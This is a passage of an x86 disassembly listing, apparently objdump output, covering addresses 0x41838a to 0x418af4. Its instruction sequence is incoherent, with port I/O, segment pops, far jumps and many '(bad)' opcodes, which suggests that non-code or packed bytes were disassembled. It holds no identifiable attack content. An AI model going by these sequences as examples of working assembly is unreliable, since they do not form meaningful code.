  41838a:	jecxz  0x4183d8
  41838c:	jnp    0x4183e2
  41838e:	test   al,0xa0
  418390:	or     dl,BYTE PTR [eax-0x2e]
  418393:	cmc    
  418394:	adc    al,0x43
  418396:	ja     0x4183c0
  418398:	fwait
  418399:	stos   BYTE PTR es:[edi],al
  41839a:	mov    ecx,0x53b71eed
  41839f:	stos   DWORD PTR es:[edi],eax
  4183a0:	cdq    
  4183a1:	in     al,dx
  4183a2:	fadd   QWORD PTR [edx+0x1d]
  4183a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183a6:	int3   
  4183a7:	and    ebx,esi
  4183a9:	popa   
  4183aa:	inc    edx
  4183ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183ac:	mov    bl,0xb1
  4183ae:	cmp    DWORD PTR [ecx],esp
  4183b0:	sub    ebx,esp
  4183b2:	pop    eax
  4183b3:	xchg   esp,eax
  4183b4:	dec    edx
  4183b5:	inc    esp
  4183b6:	ret    0x56d4
  4183b9:	xchg   esi,eax
  4183ba:	pop    ebp
  4183bb:	pop    ss
  4183bc:	jle    0x418348
  4183be:	ret    0xa760
  4183c1:	dec    eax
  4183c2:	outs   dx,DWORD PTR ds:[esi]
  4183c3:	xor    eax,0xa46f1472
  4183c8:	mov    bh,0x4b
  4183ca:	mov    eax,edi
  4183cc:	mul    DWORD PTR [edx-0x5b83f44c]
  4183d2:	sbb    al,0x80
  4183d4:	es scas eax,DWORD PTR es:[edi]
  4183d6:	gs pop es
  4183d8:	pop    ds
  4183d9:	sahf   
  4183da:	jbe    0x418445
  4183dc:	jo     0x4183da
  4183de:	inc    edx
  4183df:	not    esi
  4183e1:	push   ds
  4183e2:	cmp    BYTE PTR [edi+0x258422d5],al
  4183e8:	shl    DWORD PTR [ebp-0x72],0xa9
  4183ec:	add    bh,BYTE PTR [ecx+ebx*1-0x619cc175]
  4183f3:	sbb    al,0xbf
  4183f5:	in     al,dx
  4183f6:	clc    
  4183f7:	dec    esi
  4183f8:	test   BYTE PTR [ecx-0x1c156f38],bl
  4183fe:	shl    DWORD PTR [eax-0x29b2b644],0xc7
  418405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418406:	jl     0x418412
  418408:	push   eax
  418409:	adc    cl,al
  41840b:	cmp    DWORD PTR [edx+ebx*2-0x684ded51],ebx
  418412:	inc    esi
  418413:	ret    
  418414:	js     0x4183de
  418416:	mov    esi,0x347bcb97
  41841b:	ins    DWORD PTR es:[edi],dx
  41841c:	mov    ebp,0x62ca1f37
  418421:	or     eax,0x419a515c
  418426:	out    dx,eax
  418427:	aad    0x7a
  418429:	adc    DWORD PTR [esi-0x2b19e51b],ebp
  41842f:	idiv   BYTE PTR [edx+ecx*1+0x60]
  418433:	stc    
  418434:	out    0xd2,eax
  418436:	bound  eax,QWORD PTR [eax]
  418438:	nop
  418439:	mov    ds:0x6f13a010,eax
  41843e:	xchg   esp,eax
  41843f:	je     0x41844c
  418441:	iret   
  418442:	in     eax,dx
  418443:	add    dh,bh
  418445:	xchg   BYTE PTR [esp+0x3e],ch
  418449:	leave  
  41844a:	out    0x73,al
  41844c:	cmp    eax,0xa66ca1d0
  418451:	cdq    
  418452:	(bad)  
  418453:	pop    ds
  418454:	sahf   
  418455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418456:	and    BYTE PTR [esi+0x6b],ah
  418459:	cmp    DWORD PTR [ecx+0x6e],ebx
  41845c:	xchg   ebx,eax
  41845d:	scas   eax,DWORD PTR es:[edi]
  41845e:	(bad)  
  41845f:	aam    0x9d
  418461:	(bad)  
  418462:	les    edi,FWORD PTR [ebx+edx*1]
  418465:	into   
  418466:	mov    cl,0xbc
  418468:	dec    ecx
  418469:	pop    ds
  41846a:	pop    ebp
  41846b:	mov    al,ds:0x88fb33e3
  418470:	and    al,dh
  418472:	ja     0x41842a
  418474:	cmp    al,0x30
  418476:	retf   
  418477:	lahf   
  418478:	mov    bl,0x34
  41847a:	sti    
  41847b:	iret   
  41847c:	or     bh,0x1f
  41847f:	adc    edx,DWORD PTR [edi-0x32]
  418482:	sub    edx,DWORD PTR [ebx+0x5382711a]
  418488:	aaa    
  418489:	js     0x418447
  41848b:	mov    ds:0x4baec828,eax
  418490:	cmp    ecx,DWORD PTR [ebx-0x2a739065]
  418496:	mov    ebx,0xb2d8e20f
  41849b:	adc    al,0x1
  41849d:	adc    ecx,edi
  41849f:	dec    edx
  4184a0:	retf   
  4184a1:	mov    gs,WORD PTR [ebp-0x30]
  4184a4:	out    dx,al
  4184a5:	jb     0x41847a
  4184a7:	inc    ebp
  4184a8:	stos   DWORD PTR es:[edi],eax
  4184a9:	jmp    0x9c57:0x3510758e
  4184b0:	mov    ds:0x5391980b,eax
  4184b5:	lock dec ebp
  4184b7:	mov    esi,0x19f2b32d
  4184bc:	sbb    dh,BYTE PTR [eax-0x77]
  4184bf:	call   0x7bc1:0xd12112ae
  4184c6:	iret   
  4184c7:	nop
  4184c8:	pop    edx
  4184c9:	and    BYTE PTR [edi-0x29b98b28],dl
  4184cf:	(bad)  
  4184d0:	fucomi st,st(4)
  4184d2:	push   ecx
  4184d3:	push   0xfffffff8
  4184d5:	cwde   
  4184d6:	loop   0x4184c8
  4184d8:	inc    esi
  4184d9:	sub    eax,ecx
  4184db:	gs icebp 
  4184dd:	lock out 0x23,eax
  4184e0:	mov    esp,0x97523090
  4184e5:	sbb    ebx,edx
  4184e7:	or     eax,0x51fe0493
  4184ec:	aam    0x2b
  4184ee:	scas   eax,DWORD PTR es:[edi]
  4184ef:	mov    bh,0x7
  4184f1:	xchg   edi,eax
  4184f2:	cmc    
  4184f3:	adc    al,0xf8
  4184f5:	loope  0x418501
  4184f7:	add    BYTE PTR [edx-0x67671098],bh
  4184fd:	xchg   edx,eax
  4184fe:	or     BYTE PTR [ecx],dh
  418500:	sub    eax,0xdf868ef0
  418505:	popf   
  418506:	aad    0x64
  418508:	lock adc DWORD PTR [edx+esi*2+0x43],eax
  41850d:	ins    DWORD PTR es:[edi],dx
  41850e:	in     al,0x46
  418510:	jno    0x4184b8
  418512:	test   DWORD PTR [esi+0x1097baf0],eax
  418518:	ss dec esi
  41851a:	xor    esp,DWORD PTR [edx+0x7a]
  41851d:	pusha  
  41851e:	cld    
  41851f:	rcr    DWORD PTR [eax],cl
  418521:	or     edi,DWORD PTR [esi-0xe]
  418524:	(bad)  
  418525:	lds    esp,FWORD PTR [ebx-0x58]
  418528:	ds mov ah,0x4b
  41852b:	dec    esi
  41852c:	clc    
  41852d:	les    ecx,FWORD PTR [eax-0x2c]
  418530:	adc    ch,BYTE PTR [ebx]
  418532:	add    ebx,edi
  418534:	xchg   ebp,eax
  418536:	(bad)  
  418537:	pop    ecx
  418538:	jp     0x4185a2
  41853a:	sub    esi,edi
  41853c:	jmp    0xece4b1be
  418541:	push   es
  418542:	xor    ch,cl
  418544:	lahf   
  418545:	out    dx,eax
  418546:	inc    ecx
  418547:	xchg   BYTE PTR [eax+0x261b7213],ch
  41854d:	adc    BYTE PTR [edi+0x110d3f47],ah
  418553:	test   eax,0x802fa6b0
  418558:	retf   
  418559:	pushf  
  41855a:	xor    DWORD PTR [eax+edi*8],esi
  41855d:	or     DWORD PTR [esp+eiz*8-0x1d6b35da],ebx
  418564:	jge    0x4184e7
  418566:	pop    ds
  418567:	outs   dx,DWORD PTR ds:[esi]
  418568:	inc    edx
  418569:	rcl    BYTE PTR [esi-0x1e],1
  41856c:	repz aas 
  41856e:	and    bl,ah
  418570:	jle    0x41858e
  418572:	adc    ecx,esp
  418574:	jns    0x41850e
  418576:	in     eax,0xf2
  418578:	push   0xffffffe7
  41857a:	cmp    ebp,DWORD PTR [ecx-0x34]
  41857d:	or     ecx,ebx
  41857f:	sbb    ebx,DWORD PTR fs:[edi+0x607835fd]
  418586:	xchg   ebx,eax
  418587:	adc    eax,0xc8b9fb5c
  41858c:	inc    edx
  41858d:	push   ebx
  41858e:	mov    esi,0x92e91597
  418593:	sahf   
  418594:	std    
  418595:	xchg   BYTE PTR [esi+0x658ce2b2],dh
  41859b:	sahf   
  41859c:	jbe    0x4185db
  41859e:	dec    esp
  41859f:	aas    
  4185a0:	aam    0x78
  4185a2:	test   eax,0x1d34c8b6
  4185a7:	into   
  4185a8:	addr16 cmp eax,0x1206a0e6
  4185ae:	fcmovu st,st(3)
  4185b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185b1:	jo     0x418571
  4185b3:	or     al,0xdc
  4185b5:	pop    eax
  4185b6:	mov    dl,0x2b
  4185b8:	xchg   esp,eax
  4185b9:	mov    ch,0x17
  4185bb:	scas   eax,DWORD PTR es:[edi]
  4185bc:	xchg   esp,eax
  4185bd:	loope  0x418627
  4185bf:	arpl   bp,si
  4185c1:	daa    
  4185c2:	popf   
  4185c3:	mov    BYTE PTR [ebp-0x6ad30563],bl
  4185c9:	xchg   ebp,eax
  4185ca:	mov    ebx,0x242f62d
  4185cf:	je     0x41862f
  4185d1:	mov    DWORD PTR [ebx],ecx
  4185d3:	lahf   
  4185d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185d5:	push   edx
  4185d6:	sub    DWORD PTR [ecx+edx*2-0x33],0xffffffa4
  4185db:	mov    WORD PTR [edi+0xf],?
  4185de:	fdiv   DWORD PTR [edx+esi*1-0x3c]
  4185e2:	pop    edx
  4185e3:	lods   eax,DWORD PTR ds:[esi]
  4185e4:	jo     0x4185b0
  4185e6:	cld    
  4185e7:	adc    eax,DWORD PTR [edx]
  4185e9:	out    0xd9,eax
  4185eb:	popf   
  4185ec:	adc    eax,0xb0641ad
  4185f1:	call   0xf61835ea
  4185f6:	(bad)  
  4185f7:	push   edx
  4185f8:	adc    eax,0x40d1e95b
  4185fd:	jl     0x418650
  4185ff:	mov    dl,0x6b
  418601:	or     BYTE PTR [ebx+0x1],bl
  418604:	nop
  418605:	mov    ebx,0xb7167e18
  41860a:	hlt    
  41860b:	ins    DWORD PTR es:[edi],dx
  41860c:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41860e:	fistp  WORD PTR [esi]
  418610:	stc    
  418611:	aaa    
  418612:	or     eax,0x19475cc1
  418617:	push   esi
  418618:	sub    BYTE PTR [eax],ch
  41861a:	scas   al,BYTE PTR es:[edi]
  41861b:	jo     0x418658
  41861d:	xor    al,0x36
  41861f:	add    al,0xf7
  418621:	je     0x4185a4
  418623:	push   ds
  418624:	or     BYTE PTR [eax+ecx*2-0x5b],ch
  418628:	jo     0x418699
  41862a:	imul   esp,ebx,0x7a6bc35
  418630:	cmc    
  418631:	out    dx,al
  418632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418633:	mov    bh,BYTE PTR [ecx]
  418635:	pop    esi
  418636:	test   DWORD PTR [edx],eax
  418638:	cmp    al,BYTE PTR [edx]
  41863a:	and    ecx,esi
  41863c:	out    dx,al
  41863d:	ja     0x41868b
  41863f:	adc    BYTE PTR [ecx-0x5c66d869],dl
  418645:	stc    
  418646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418647:	nop
  418648:	sbb    dh,BYTE PTR [ecx]
  41864a:	xor    BYTE PTR [eax+0xc2edc15],dl
  418650:	out    0x76,al
  418652:	xchg   esi,eax
  418653:	or     DWORD PTR gs:[esi-0x6e791040],ebx
  41865a:	and    bl,BYTE PTR [ebp-0x45]
  41865d:	adc    dh,BYTE PTR [edx]
  41865f:	xor    BYTE PTR [eax],ah
  418661:	lods   eax,DWORD PTR ds:[esi]
  418662:	loop   0x418614
  418664:	lods   eax,DWORD PTR ds:[esi]
  418665:	xchg   BYTE PTR [esi+0x503e52ae],bh
  41866b:	sub    eax,DWORD PTR ds:0x9cd24bed
  418671:	mov    dl,0x2f
  418673:	xchg   edx,eax
  418674:	rol    BYTE PTR [ebp+0x221b1846],1
  41867a:	repnz inc ebx
  41867c:	jmp    0x4be:0x59506ae2
  418683:	imul   eax,DWORD PTR [eax],0x7
  418686:	shl    BYTE PTR [eax-0x219f2be8],0x7d
  41868d:	sbb    ebp,edx
  41868f:	push   edx
  418690:	lds    esp,FWORD PTR [edx]
  418692:	sar    bh,cl
  418694:	xor    ecx,DWORD PTR [edi-0x24bbe39e]
  41869a:	mov    DWORD PTR [ebp-0x74],ebp
  41869d:	cdq    
  41869e:	xor    DWORD PTR [esi],ebp
  4186a0:	pop    edx
  4186a1:	(bad)  
  4186a2:	xchg   ebp,eax
  4186a3:	mov    bl,0xc2
  4186a5:	dec    eax
  4186a6:	sbb    eax,DWORD PTR [ebx+ebx*4-0x39]
  4186aa:	mov    al,BYTE PTR [edx+0x4d]
  4186ad:	cmp    BYTE PTR [ecx],dl
  4186af:	mov    esp,0xaf6be98b
  4186b4:	out    dx,al
  4186b5:	cmp    cl,BYTE PTR [eax-0x63]
  4186b8:	inc    eax
  4186b9:	mov    eax,0x54ba5ccd
  4186be:	les    esi,FWORD PTR [esi+esi*2+0x61]
  4186c2:	mov    al,ds:0x4e1412f3
  4186c7:	fs (bad) 
  4186c9:	mov    al,0x37
  4186cb:	xlat   BYTE PTR ds:[ebx]
  4186cc:	test   eax,0x314523ad
  4186d1:	pop    ebx
  4186d2:	sbb    eax,0x40999a2e
  4186d7:	jge    0x4186d1
  4186d9:	pop    es
  4186da:	neg    BYTE PTR [edi+0x74]
  4186dd:	lea    ebp,[edi+0x6d0e9290]
  4186e3:	mov    ebp,0x1256936b
  4186e8:	and    BYTE PTR [eax+0x41],0x9d
  4186ec:	jbe    0x4186f7
  4186ee:	mov    cl,0x9e
  4186f0:	push   es
  4186f1:	hlt    
  4186f2:	ror    dh,1
  4186f4:	lds    ecx,FWORD PTR [ebx]
  4186f6:	loop   0x41875f
  4186f8:	xor    al,0xad
  4186fa:	xchg   ebp,eax
  4186fb:	addr16 imul esp
  4186fe:	or     bl,bl
  418700:	inc    ebp
  418701:	std    
  418702:	mov    ds:0x9413cca5,al
  418707:	ss xchg ebp,eax
  418709:	(bad)
  41870c:	jp     0x41873e
  41870e:	in     eax,dx
  41870f:	sti    
  418710:	jle    0x41876a
  418712:	mov    eax,DWORD PTR [ebx-0x57]
  418715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418716:	das    
  418717:	push   cs
  418718:	sbb    edx,DWORD PTR [ebp-0x2187776]
  41871e:	(bad)  
  41871f:	cmp    esp,DWORD PTR [ebx+ebx*4]
  418722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418723:	mov    WORD PTR es:[eax-0x45],ds
  418727:	xchg   edx,eax
  418728:	lahf   
  418729:	std    
  41872a:	in     eax,dx
  41872b:	(bad)  
  41872c:	xor    esp,DWORD PTR ds:0xb4c79a9f
  418732:	rcl    ch,cl
  418734:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418735:	cs sbb ch,ch
  418738:	push   esp
  418739:	push   esi
  41873a:	int3   
  41873b:	cdq    
  41873c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41873d:	stos   BYTE PTR es:[edi],al
  41873e:	arpl   WORD PTR [ebp-0x1af1c1af],bx
  418744:	sub    BYTE PTR ds:0xf70e4b3b,bh
  41874a:	loop   0x4187b5
  41874c:	je     0x4187a2
  41874e:	adc    ebx,DWORD PTR [esi+edi*2+0x60]
  418752:	repz dec ebp
  418754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418755:	jmp    0x41878b
  418757:	daa    
  418758:	xor    ch,BYTE PTR [ecx]
  41875a:	loope  0x4186f0
  41875c:	gs jmp 0x41873e
  41875f:	imul   ecx,DWORD PTR [edx-0x26],0xc14d7d21
  418766:	xchg   ebp,eax
  418767:	jo     0x418795
  418769:	mov    bl,0xbe
  41876b:	test   DWORD PTR gs:[ebx+eiz*8],0x1ad29472
  418773:	out    0x61,eax
  418775:	sbb    BYTE PTR [edx+0x44478b0],bh
  41877b:	and    dl,BYTE PTR [esi-0x11e46e4c]
  418781:	fisttp DWORD PTR [ebx-0x4c]
  418784:	mov    DWORD PTR [esi+0x6f794499],esp
  41878a:	icebp  
  41878b:	clc    
  41878c:	shl    DWORD PTR [edi-0x6b],cl
  41878f:	add    ch,bl
  418791:	xlat   BYTE PTR ds:[ebx]
  418792:	cmp    BYTE PTR [ecx],ah
  418794:	push   eax
  418795:	dec    ecx
  418796:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418797:	dec    eax
  418798:	mov    dl,0xa6
  41879a:	pop    ds
  41879b:	scas   eax,DWORD PTR es:[edi]
  41879c:	(bad)  
  41879d:	loope  0x418740
  41879f:	hlt    
  4187a0:	jb     0x418802
  4187a2:	inc    ebp
  4187a3:	sti    
  4187a4:	cmp    edx,DWORD PTR [edx+0x7e]
  4187a7:	xchg   ebp,eax
  4187a8:	dec    esp
  4187a9:	jnp    0x418787
  4187ab:	aam    0xde
  4187ad:	mov    dh,0x63
  4187af:	adc    ebp,DWORD PTR ds:0x7b4afcb4
  4187b5:	push   edx
  4187b6:	xor    al,BYTE PTR [esi]
  4187b8:	xlat   BYTE PTR ds:[ebx]
  4187b9:	xor    ebx,DWORD PTR [ebx-0x2d7955ac]
  4187bf:	or     BYTE PTR [edi+edi*8],0x82
  4187c3:	dec    eax
  4187c4:	sbb    al,0xba
  4187c6:	js     0x4187d2
  4187c8:	mov    al,ds:0xb31d2b05
  4187cd:	pushf  
  4187ce:	shl    esi,1
  4187d0:	mov    eax,0xf69a741c
  4187d5:	add    BYTE PTR [eax+0x13],cl
  4187d8:	fidivr WORD PTR [eax+0x4f5c6792]
  4187de:	test   BYTE PTR [edx],ah
  4187e0:	adc    bh,cl
  4187e2:	imul   esi,eax,0x57
  4187e5:	std    
  4187e6:	je     0x4187d9
  4187e8:	pop    ds
  4187e9:	pop    eax
  4187ea:	jae    0x4187f5
  4187ec:	inc    DWORD PTR [esi-0x955ca1d]
  4187f2:	retf   
  4187f3:	mov    cl,0x2d
  4187f5:	push   ebp
  4187f6:	or     esp,ebp
  4187f8:	jno    0x4187f0
  4187fa:	pop    ds
  4187fb:	retf   
  4187fc:	stos   DWORD PTR es:[edi],eax
  4187fd:	loopne 0x4187e4
  4187ff:	or     bl,BYTE PTR [edx-0x13]
  418802:	lods   al,BYTE PTR ds:[esi]
  418803:	mov    ds:0xb63b6dd,al
  418808:	jnp    0x4187db
  41880a:	xor    eax,DWORD PTR [ebp-0x7e4f5789]
  418810:	stc    
  418811:	fmul   DWORD PTR cs:[esi-0x708cf61f]
  418818:	pop    esp
  418819:	retf   0xbb17
  41881c:	outs   dx,BYTE PTR ds:[esi]
  41881d:	test   BYTE PTR [ebp+0x76],bl
  418820:	(bad)
  418823:	call   0x98bd769f
  418828:	div    DWORD PTR [ebx]
  41882a:	out    dx,eax
  41882b:	xor    eax,0x3597c771
  418830:	loopne 0x418870
  418832:	test   BYTE PTR [ebx+0x38],cl
  418835:	out    0xe5,al
  418837:	jmp    0x86cf:0xdcbffb43
  41883e:	xchg   edi,eax
  41883f:	hlt    
  418840:	push   edx
  418841:	test   BYTE PTR [esi+0x72],dl
  418844:	jle    0x4188ba
  418846:	xor    edi,esp
  418848:	sti    
  418849:	cwde   
  41884a:	pop    eax
  41884b:	jne    0x418852
  41884d:	dec    ecx
  41884e:	jo     0x4187ed
  418850:	pop    esp
  418851:	xor    dh,BYTE PTR [edx+0x4baac10a]
  418857:	iret   
  418858:	pop    ss
  418859:	pop    ecx
  41885a:	inc    edx
  41885b:	popa   
  41885c:	enter  0xbabb,0xb7
  418860:	(bad)  
  418861:	fwait
  418862:	out    0x32,al
  418864:	call   0xea8b6a3b
  418869:	mov    cl,0x5a
  41886b:	mov    cl,0xc
  41886d:	(bad)  
  41886e:	(bad)  
  41886f:	js     0x418885
  418871:	jl     0x4188e4
  418873:	jns    0x4188bb
  418875:	mov    ebp,0x3acfde51
  41887a:	push   eax
  41887b:	call   0xc67a:0x3fa6d19e
  418882:	sub    al,0x64
  418884:	es xor eax,0x7b148562
  41888a:	(bad)  
  41888b:	fiadd  WORD PTR [ebx+edx*1]
  41888e:	test   eax,0x4926f43d
  418893:	jmp    0x7c310b75
  418898:	adc    BYTE PTR [eax-0x64b12786],dl
  41889e:	fcomip st,st(4)
  4188a0:	(bad)  
  4188a1:	mov    BYTE PTR [ebp-0x658f54c2],dh
  4188a7:	push   eax
  4188a8:	cmp    BYTE PTR [ecx],ah
  4188aa:	jmp    0x4188f5
  4188ac:	mul    DWORD PTR [edi-0x7618a4c5]
  4188b2:	stos   DWORD PTR es:[edi],eax
  4188b3:	jmp    0xbd40:0xe1b1d061
  4188ba:	out    dx,al
  4188bb:	fiadd  DWORD PTR [eax]
  4188bd:	sbb    ebp,ecx
  4188bf:	jne    0x418927
  4188c1:	add    DWORD PTR ds:0x80f09ec4,ecx
  4188c7:	test   BYTE PTR [edi+0x4e],cl
  4188ca:	jbe    0x418921
  4188cc:	xchg   edi,eax
  4188cd:	pop    es
  4188ce:	fstp   st(5)
  4188d0:	or     eax,0x2f0f14d9
  4188d5:	sbb    cl,BYTE PTR [edi]
  4188d7:	dec    ebx
  4188d8:	sub    DWORD PTR [edx+0x32],ebp
  4188db:	div    BYTE PTR [ebx]
  4188dd:	jl     0x4188d4
  4188df:	ds xchg esi,eax
  4188e1:	and    ch,cl
  4188e3:	fs or  eax,0xecc4a1b2
  4188e9:	xor    dh,0x4b
  4188ec:	adc    eax,0xc36ef4ca
  4188f1:	add    eax,0x84db8d67
  4188f6:	jg     0x418919
  4188f8:	sbb    DWORD PTR [eax],esp
  4188fa:	(bad)  
  4188fb:	(bad)  
  4188fc:	test   ah,0x48
  4188ff:	scas   al,BYTE PTR es:[edi]
  418900:	arpl   WORD PTR [ebx],di
  418902:	pushf  
  418903:	dec    ebx
  418904:	cdq    
  418905:	(bad)  
  418906:	shr    DWORD PTR [ecx+eax*8],0xa8
  41890a:	arpl   ax,ax
  41890c:	(bad)  
  41890d:	repz test DWORD PTR [ebp+ebp*1-0x19],eax
  418912:	push   ebp
  418913:	addr16 fs cmp eax,0xcae923c7
  41891a:	dec    ecx
  41891b:	push   0xffffff8e
  41891d:	cmc    
  41891e:	xchg   esi,eax
  41891f:	jmp    0x418983
  418921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418922:	mov    ah,0xa
  418924:	xchg   ecx,eax
  418925:	mov    al,0xc8
  418927:	mov    eax,DWORD PTR [ecx+0x399cc03c]
  41892d:	xlat   BYTE PTR ds:[ebx]
  41892e:	retf   0xb72e
  418931:	sbb    dl,dl
  418933:	imul   ebp,DWORD PTR [edi+ecx*2+0x20],0x52
  418938:	add    ebx,0xfffffff6
  41893b:	push   eax
  41893c:	and    edx,eax
  41893e:	pop    esp
  41893f:	repz adc al,0x64
  418942:	xlat   BYTE PTR ds:[ebx]
  418943:	pop    esi
  418944:	jb     0x41894f
  418946:	sbb    cl,BYTE PTR [esi]
  418948:	rol    cl,cl
  41894a:	xor    DWORD PTR [ebx-0x17],esi
  41894d:	stos   BYTE PTR es:[edi],al
  41894e:	jno    0x4189c9
  418950:	xor    al,0xdc
  418952:	jae    0x41893a
  418954:	inc    esp
  418955:	jg     0x4188fc
  418957:	clc    
  418958:	xchg   ebp,eax
  418959:	shl    bl,0x87
  41895c:	dec    edx
  41895d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41895e:	call   0xeeb8:0x5c936313
  418965:	and    al,0x63
  418967:	pop    esi
  418968:	cmp    DWORD PTR ds:0x1a8c1cdc,ecx
  41896e:	daa    
  41896f:	pushf  
  418970:	dec    esi
  418971:	mov    cl,BYTE PTR [ecx+ebp*2-0x452dd558]
  418978:	push   0xffffffcb
  41897a:	adc    cl,BYTE PTR [edx+ebx*4-0x3edda68]
  418981:	xor    DWORD PTR [eax-0x12],esi
  418984:	pop    ss
  418985:	xchg   edx,eax
  418986:	icebp  
  418987:	shl    BYTE PTR [ecx+0x4c],1
  41898a:	xchg   edi,eax
  41898b:	adc    DWORD PTR [edi-0xa],edi
  41898e:	xor    bl,cl
  418990:	sbb    eax,0x9b35a022
  418995:	mov    eax,ds:0x7ccac8cb
  41899a:	add    ch,BYTE PTR [edx-0x3]
  41899d:	and    DWORD PTR [edi+0x72],esi
  4189a0:	jmp    0xfe54d51b
  4189a5:	add    BYTE PTR ss:[ebp-0x73],al
  4189a9:	lods   al,BYTE PTR ds:[esi]
  4189aa:	(bad)  
  4189ab:	leave  
  4189ac:	mov    bh,0x1f
  4189ae:	pop    ds
  4189af:	dec    edi
  4189b0:	or     ebp,DWORD PTR [esi+eax*1]
  4189b3:	mov    al,ds:0xbffa05c7
  4189b8:	dec    ecx
  4189b9:	xor    al,0x81
  4189bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189bc:	pop    ebx
  4189bd:	adc    ecx,DWORD PTR [edx-0x7d]
  4189c0:	sti    
  4189c1:	sub    DWORD PTR [edx],edi
  4189c3:	call   0x3f73:0xf68e0d3
  4189ca:	scas   eax,DWORD PTR es:[edi]
  4189cb:	mov    ds:0xd705c53,al
  4189d0:	and    dl,cl
  4189d2:	mov    ds:0x3bb3c755,al
  4189d7:	sub    al,0x6d
  4189d9:	sbb    BYTE PTR [edx+0x1ef68ef],cl
  4189df:	call   0x339a:0x9be19e6
  4189e6:	out    0x55,eax
  4189e8:	imul   edi,edx,0x6a4f8e27
  4189ee:	sub    bl,BYTE PTR [esi]
  4189f0:	out    0x7e,eax
  4189f2:	pop    ds
  4189f3:	cmc    
  4189f4:	ret    0x2298
  4189f7:	xchg   esi,eax
  4189f8:	inc    ebp
  4189f9:	dec    edi
  4189fa:	mov    dl,0x7d
  4189fc:	fs call 0x50ce9f43
  418a02:	and    dh,al
  418a04:	sbb    al,BYTE PTR [edx]
  418a06:	xchg   DWORD PTR [ebp+0x1f],esp
  418a09:	aad    0x6c
  418a0b:	sub    al,0x6e
  418a0d:	xchg   ebx,eax
  418a0e:	mov    bl,0x18
  418a10:	adc    ah,BYTE PTR [edi]
  418a12:	(bad)  
  418a13:	pop    ss
  418a14:	cmc    
  418a15:	push   0x66be21ec
  418a1a:	fnsave [esi-0x52ba61b6]
  418a20:	clc    
  418a21:	mov    ch,0x7e
  418a23:	xchg   esi,esi
  418a25:	mov    ebp,0xfe26c4bc
  418a2a:	mov    dl,0xb6
  418a2c:	int3   
  418a2d:	bound  esi,QWORD PTR [edx+esi*4+0x3b769b2e]
  418a34:	jg     0x4189bf
  418a36:	jle    0x418ab6
  418a38:	inc    esp
  418a39:	scas   al,BYTE PTR es:[edi]
  418a3a:	xchg   ecx,eax
  418a3b:	in     al,dx
  418a3c:	mov    dl,0x39
  418a3e:	cwde   
  418a3f:	fidiv  DWORD PTR [edx-0xc6e50dd]
  418a45:	sti    
  418a46:	push   ecx
  418a47:	mov    al,0x36
  418a49:	fidiv  DWORD PTR [ecx-0x4c]
  418a4c:	mov    dh,bl
  418a4e:	pop    ss
  418a4f:	jmp    0xff13:0xcd9349a7
  418a56:	pop    ebx
  418a57:	add    DWORD PTR [ebp+0x626dde6e],ebx
  418a5d:	add    edi,DWORD PTR [eax-0x6c]
  418a60:	outs   dx,DWORD PTR ds:[esi]
  418a61:	pop    edi
  418a62:	sbb    bh,BYTE PTR [esi]
  418a64:	fsubr  QWORD PTR [eax]
  418a66:	loope  0x418a86
  418a68:	fwait
  418a69:	inc    ebx
  418a6a:	scas   eax,DWORD PTR es:[edi]
  418a6b:	sbb    eax,0xb2587476
  418a70:	xlat   BYTE PTR ds:[ebx]
  418a71:	out    dx,eax
  418a72:	lds    esi,FWORD PTR [eax+ecx*2-0x75]
  418a76:	call   0x556e0bf7
  418a7b:	popf   
  418a7c:	jp     0x418a6e
  418a7e:	dec    ebx
  418a7f:	jecxz  0x418a63
  418a81:	je     0x418b01
  418a83:	push   edi
  418a84:	repnz out dx,al
  418a86:	xlat   BYTE PTR ds:[ebx]
  418a87:	into   
  418a88:	mov    edi,0xc801aff2
  418a8d:	xchg   esi,eax
  418a8e:	lea    ebp,[ebx-0x354889d9]
  418a94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a95:	ss loopne 0x418a57
  418a98:	xor    esp,edx
  418a9a:	popa   
  418a9b:	es addr16 jb 0x418a96
  418a9f:	push   ds
  418aa0:	fs out 0x5a,al
  418aa3:	push   ebx
  418aa4:	or     dl,BYTE PTR [ebp-0x76]
  418aa7:	sahf   
  418aa8:	cs pop ebp
  418aaa:	test   dh,dh
  418aac:	sub    al,0x33
  418aae:	xlat   BYTE PTR ds:[ebx]
  418ab0:	jne    0x418a33
  418ab2:	add    al,0x34
  418ab4:	push   ebx
  418ab5:	or     BYTE PTR [esi+0x66],dh
  418ab8:	push   ss
  418ab9:	cmp    ecx,esi
  418abb:	mov    ebp,0x64b2d0c
  418ac0:	mul    DWORD PTR [ebp-0x624e5350]
  418ac6:	ins    DWORD PTR es:[edi],dx
  418ac7:	push   edi
  418ac8:	shl    BYTE PTR [edi+edi*4],cl
  418acb:	jb     0x418aa6
  418acd:	fisubr WORD PTR [esi]
  418acf:	fstp   st(4)
  418ad1:	out    0x75,al
  418ad3:	xchg   esi,eax
  418ad4:	loop   0x418a69
  418ad6:	and    dh,BYTE PTR [edi+0xa]
  418ad9:	mov    esi,0x45181320
  418ade:	cmc    
  418adf:	shl    DWORD PTR [esi+eax*8+0x7f],cl
  418ae3:	les    edx,FWORD PTR [edi+0x43]
  418ae6:	push   ebp
  418ae7:	(bad)  
  418ae8:	(bad)  [ecx]
  418aea:	dec    edi
  418aeb:	(bad)  
  418aec:	aas    
  418aed:	add    ebx,DWORD PTR [edx-0x416d558]
  418af3:	pusha  
  418af4:	xor    dl,bh
